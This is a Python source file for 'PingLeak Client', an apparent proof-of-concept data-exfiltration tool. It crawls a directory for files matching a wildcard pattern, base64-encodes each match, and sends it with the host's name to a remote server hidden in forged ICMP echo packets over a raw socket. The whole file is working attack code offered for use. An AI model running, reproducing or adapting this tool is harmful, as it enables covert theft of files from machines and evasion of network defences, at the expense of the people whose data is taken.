'''
    PingLeak Client
    
    So much room for improvement but it does the job as a PoC
'''
import sys
import os
import base64
import hashlib
import logging
import socket
import fnmatch
import argparse
import time
import socket, struct

def f_sendfile(filepath, ipdst):
    print(f"[{filepath}]", end="", flush=True)

    if not os.path.isfile(filepath):
        print("File not found.")
        return
        
    filename = filepath.encode()
    if len(filename) > 255:
        print("Filename too long.")
        return

    with open(filepath, "rb") as f:
        filecontent     = f.read()

    b64                 = base64.b64encode(filecontent)
    hostname            = socket.gethostname().encode()
    chunklen            = 1400   #MTU. Adjust accordingly but 1400 should go everywhere. Avoid fragmentation!
    chunks              = []
    packetheader        = len(hostname).to_bytes(1, 'big') + hostname + len(filename).to_bytes(1, 'big') + filename
    firstchunk          = chunklen - (len(packetheader) + 7)
    chunks.append(packetheader + b64[:firstchunk])
    b64                 = b64[firstchunk:]

    for i in range(0, len(b64), chunklen - 7):
        chunks.append(b64[i:i+(chunklen - 7)])

    for i, chunk in enumerate(chunks):
        # If 6th char is at 1, this is end of the file. Else, 0.
        # Someone smarter than me would have put some sequencing # in the header
        header          = b"PGLK" + i.to_bytes(2, 'big') + (b'\x01' if i == len(chunks)-1 else b'\x00')
        f_icmp(ipdst, header + chunk)
        time.sleep(0.01)        # Lame solution to allow the packets to arrive in the right order.
        
    print(" Sent.")
        
        
def f_crawler(rootdir, pattern):
    matches = []
    for dirpath, dirnames, filenames in os.walk(rootdir):
        for filename in filenames:
            if fnmatch.fnmatch(filename, pattern):
                full_path       = os.path.join(dirpath, filename)
                normalized_path = full_path.replace("\\", "/")
                matches.append(normalized_path)
    return matches


def f_icmp(ipdst, payload):
    # Forging ICMP echo request packets. Don't care about echo reply.
    sock        = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
    pid         = 6174      # Showing off with Kaprekar's constant
    header      = struct.pack("bbHHh", 8, 0, 0, pid, 1)  # type=8 (echo), code=0
    header      = struct.pack("bbHHh", 8, 0, socket.htons(checksum(header + payload)), pid, 1)
    sock.sendto(header + payload, (ipdst, 0))


def checksum(source_string):
    # Thank you ChatGPT for this function.
    sum         = 0
    countTo     = (len(source_string) // 2) * 2
    count       = 0
    while count < countTo:
        thisVal = source_string[count + 1] * 256 + source_string[count]
        sum     += thisVal
        sum     &= 0xffffffff
        count   += 2
    if countTo < len(source_string):
        sum     += source_string[-1]
        sum     &= 0xffffffff
    sum         = (sum >> 16) + (sum & 0xffff)
    sum         += (sum >> 16)
    return ~sum & 0xffff


if __name__ == "__main__":
    parser      = argparse.ArgumentParser(description="PingLeak: Exfiltrate files over ICMP.")
    parser.add_argument("directory",    help="Directory to search")
    parser.add_argument("pattern",      help="Wildcard pattern (e.g., '*.xls?')")
    parser.add_argument("server",       help="IP/Name of the PingLeak Server")
    args        = parser.parse_args()
    found_files = f_crawler(args.directory, args.pattern)
    for file in found_files:        
        f_sendfile(file, args.server)
        time.sleep(0.5)
